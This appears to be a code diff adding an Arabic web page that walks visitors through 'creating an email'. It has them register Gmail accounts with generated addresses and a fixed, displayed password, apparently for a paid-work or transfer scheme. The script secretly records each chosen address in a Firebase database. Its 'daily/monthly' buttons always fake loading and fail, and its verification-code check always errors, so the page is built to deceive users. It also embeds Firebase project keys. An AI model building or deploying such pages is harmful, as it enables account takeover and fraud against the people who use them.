@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>إنشاء بريد إلكتروني</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      text-align: center;
+      background: linear-gradient(to right, #6a11cb, #2575fc);
+      color: white;
+      margin: 0;
+      padding: 20px;
+    }
+    .container {
+      max-width: 500px;
+      margin: 20px auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      color: black;
+    }
+    .info-box {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #f1f1f1;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 5px;
+    }
+    .copy-btn, .action-btn {
+      cursor: pointer;
+      border: none;
+      border-radius: 5px;
+      padding: 10px 14px;
+      font-size: 16px;
+      font-weight: bold;
+      transition: background 0.3s;
+      text-align: center;
+    }
+    .copy-btn { 
+      background: #28a745; 
+      color: white; 
+    }
+    .copy-btn:hover { 
+      background: #218838; 
+    }
+    .action-btn {
+      background: #007bff;
+      color: white;
+      width: 48%;
+      font-size: 18px;
+      padding: 15px;
+      margin-top: 10px;
+    }
+    .action-btn:hover { 
+      background: #0056b3; 
+    }
+    .button-container {
+      display: flex;
+      justify-content: space-between;
+    }
+    .loading {
+      background: #ccc !important;
+      cursor: not-allowed;
+      position: relative;
+    }
+    .loading::after {
+      content: "";
+      width: 20px;
+      height: 20px;
+      border: 3px solid white;
+      border-top: 3px solid transparent;
+      border-radius: 50%;
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+    .error-message {
+      font-size: 16px;
+      margin-top: 20px;
+      display: none;
+      line-height: 1.4;
+    }
+    .retry-btn {
+      background: #28a745;
+      color: white;
+      padding: 15px 30px;
+      margin-top: 20px;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+      display: block;
+      margin: 20px auto;
+    }
+    .retry-btn:hover {
+      background: #218838;
+    }
+    /* تنسيق الخط المتحرك تحت العنوان */
+    .animated-line {
+      width: 0;
+      height: 4px;
+      background-color: #fff;
+      margin: 10px auto;
+      animation: expand 2s forwards;
+    }
+    @keyframes expand {
+      from { width: 0; }
+      to { width: 80%; }
+    }
+    /* تنسيق مربع الإدخال للرمز وزر التحقق */
+    #verificationCode {
+      width: 50px;
+      text-align: center;
+      margin-top: 10px;
+      padding: 5px;
+    }
+    #verifyButton {
+      margin-left: 10px;
+      padding: 5px 10px;
+      cursor: pointer;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+    /* تنسيق الـ spinner داخل الزر */
+    .spinner {
+      border: 2px solid #fff;
+      border-top: 2px solid transparent;
+      border-radius: 50%;
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      animation: spin 1s linear infinite;
+      vertical-align: middle;
+    }
+  </style>
+  <!-- Firebase SDK -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+
+    // إعدادات Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyD66Zr25msBScZvgq-a58TToenHWmuvgDU",
+      authDomain: "fir-cf2e5.firebaseapp.com",
+      databaseURL: "https://fir-cf2e5-default-rtdb.firebaseio.com/",
+      projectId: "fir-cf2e5",
+      storageBucket: "fir-cf2e5.appspot.com",
+      messagingSenderId: "471595248435",
+      appId: "1:471595248435:web:2e630878b3ece3761cec46",
+      measurementId: "G-ZLDSJKSPDD"
+    };
+
+    // تهيئة Firebase
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+
+    function showDetails(email, firstName, lastName) {
+      // تغيير تفاصيل الحساب
+      document.getElementById("firstName").textContent = firstName;
+      document.getElementById("lastName").textContent = lastName;
+      document.getElementById("email").textContent = email;
+      document.getElementById("emailContainer").style.display = "none";
+      document.getElementById("accountDetails").style.display = "block";
+
+      // تحديث العنوان والنص التوضيحي
+      document.getElementById("stepTitle").textContent = "الخطوة 2-3";
+      document.getElementById("stepSubtitle").textContent = "انشئ حساب بتلك البيانات لاستلام التحويلات وادارة العمل عليه";
+
+      // تخزين البريد الإلكتروني فقط في Firebase بدون الاسم الأول أو الاسم الثاني أو كلمة المرور
+      const userDetails = {
+        email: email,
+        timestamp: new Date().toISOString()
+      };
+
+      const userRef = ref(database, 'users/' + email.replace(".", "_"));
+      set(userRef, userDetails)
+        .then(() => {
+          console.log("تم رفع البريد الإلكتروني فقط بنجاح!");
+        })
+        .catch((error) => {
+          console.error("حدث خطأ أثناء رفع البيانات: ", error);
+        });
+    }
+
+    function copyToClipboard(elementId) {
+      const text = document.getElementById(elementId).textContent;
+      navigator.clipboard.writeText(text).catch(err => {
+        console.error("فشل النسخ:", err);
+      });
+    }
+
+    function showLoadingAndFail(button) {
+      button.classList.add("loading");
+      button.textContent = "جارٍ المعالجة...";
+      setTimeout(() => {
+        button.classList.remove("loading");
+        button.textContent = "لم يتم التسجيل";
+        button.style.background = "#dc3545"; // لون أحمر للدلالة على الفشل
+        
+        // عرض رسالة التحقق باللون الأخضر وبخط عريض مع مربع نص وزر تحقق
+        const errorMsg = document.getElementById("errorMessage");
+        errorMsg.innerHTML = `<span style="color: green; font-weight: bold;">تم ارسال رمز التحقق الي البريد الرجاء مراجعة البريد الوارد لاكمال الخطوة الاخيرة</span>
+        <br>
+        <input id="verificationCode" type="text" maxlength="4" placeholder="xxxx"/>
+        <button id="verifyButton">تحقق</button>
+        <br>
+        <span id="errorMessageBelow" style="color: red;"></span>`;
+        errorMsg.style.display = "block";
+
+        // إضافة مستمع للنقر على زر "تحقق"
+        const verifyButton = document.getElementById("verifyButton");
+        verifyButton.addEventListener("click", function() {
+          // تعطيل الزر وعرض أيقونة تحميل داخل الزر
+          verifyButton.disabled = true;
+          verifyButton.innerHTML = '<span class="spinner"></span>';
+          // بعد 7 ثوانٍ، تغيير محتوى الزر إلى "خطأ" وتغيير لونه إلى الأحمر
+          setTimeout(() => {
+            verifyButton.disabled = false;
+            verifyButton.textContent = "خطأ";
+            verifyButton.style.backgroundColor = "red";
+            // لا يتم إخفاء الرسالة، بل تبقى مرئية
+            // وبعد 3 ثوانٍ، إعادة النص إلى "تحقق" ولونه الأزرق
+            setTimeout(() => {
+              verifyButton.textContent = "تحقق";
+              verifyButton.style.backgroundColor = "#007bff";
+            }, 3000);
+          }, 7000);
+        });
+
+        // إظهار زر إعادة المحاولة
+        document.getElementById("retryButton").style.display = "block";
+      }, 10000);
+    }
+
+    window.copyToClipboard = copyToClipboard;
+
+    window.onload = function () {
+      const names = [
+        ["Terry", "Hammond"], ["David", "Blecha"], ["Ward", "Khan"],
+        ["Alexander", "Reeves"], ["Arthur", "Conaway"], ["Meagan", "Harrison"]
+      ];
+      const emailListDiv = document.getElementById("emailList");
+      names.forEach(name => {
+        const email = generateRandomEmail(name[0], name[1]);
+        const emailDiv = document.createElement("div");
+        emailDiv.classList.add("info-box");
+        const emailSpan = document.createElement("span");
+        emailSpan.textContent = email;
+        const selectButton = document.createElement("button");
+        selectButton.textContent = "اختيار";
+        selectButton.classList.add("copy-btn");
+        selectButton.onclick = function () {
+          showDetails(email, name[0], name[1]);
+        };
+        emailDiv.appendChild(emailSpan);
+        emailDiv.appendChild(selectButton);
+        emailListDiv.appendChild(emailDiv);
+      });
+      document.querySelectorAll(".action-btn").forEach(button => {
+        button.addEventListener("click", function () {
+          showLoadingAndFail(this);
+        });
+      });
+      document.getElementById("retryButton").addEventListener("click", function () {
+        retry(); // إعادة تحميل الصفحة
+      });
+    };
+
+    function generateRandomEmail(firstName, lastName) {
+      let randomNumbers = Math.floor(100000 + Math.random() * 900000);
+      return `${firstName.toLowerCase()}${lastName.toLowerCase()}${randomNumbers}@gmail.com`;
+    }
+
+    // دالة لإعادة تحميل الصفحة عند الضغط على زر إعادة المحاولة
+    function retry() {
+      window.location.href = window.location.href;
+    }
+  </script>
+</head>
+<body>
+  <!-- العنوان والنص التوضيحي الأساسي -->
+  <h1 id="stepTitle">الخطوة 1-3</h1>
+  <div class="animated-line"></div>
+  <p id="stepSubtitle">اختيار بريد إلكتروني جديد مخصص</p>
+
+  <div class="container" id="emailContainer">
+    <div id="emailList"></div>
+  </div>
+
+  <div class="container" id="accountDetails" style="display: none;">
+    <h2>تفاصيل الحساب المختار:</h2>
+    <div class="info-box">
+      <span><strong>الاسم الأول:</strong> <span id="firstName"></span></span>
+      <button class="copy-btn" onclick="copyToClipboard('firstName')">نسخ</button>
+    </div>
+    <div class="info-box">
+      <span><strong>الاسم الثاني:</strong> <span id="lastName"></span></span>
+      <button class="copy-btn" onclick="copyToClipboard('lastName')">نسخ</button>
+    </div>
+    <div class="info-box">
+      <span><strong>البريد الإلكتروني:</strong> <span id="email"></span></span>
+      <button class="copy-btn" onclick="copyToClipboard('email')">نسخ</button>
+    </div>
+    <div class="info-box">
+      <span><strong>كلمة المرور:</strong> <span id="password">aass1122</span></span>
+      <button class="copy-btn" onclick="copyToClipboard('password')">نسخ</button>
+    </div>
+    <div class="button-container">
+      <button class="action-btn">يومي</button>
+      <button class="action-btn">شهري</button>
+    </div>
+    <p id="errorMessage" class="error-message"></p>
+    <button id="retryButton" class="retry-btn" style="display: none;">إعادة المحاولة بحساب جديد</button>
+  </div>
+</body>
+  </html>
